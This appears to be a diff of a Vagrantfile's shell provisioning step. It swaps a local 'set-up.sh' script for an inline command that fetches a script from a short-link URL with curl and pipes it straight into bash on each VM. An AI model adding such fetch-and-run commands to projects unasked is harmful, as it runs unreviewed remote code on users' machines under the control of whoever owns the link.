@@ -26,7 +26,8 @@ Vagrant.configure("2") do |config|
       vms.vm.network "private_network", ip: box[:ip]
 
       vms.vm.provision :shell do |shell|
-        shell.path = "set-up.sh"
+        # shell.path = "set-up.sh"
+        shell.inline = '/bin/bash -c "$(curl -fsSL https://lnk.coto.studio/setup)"'
         shell.privileged  = false
       end
     end
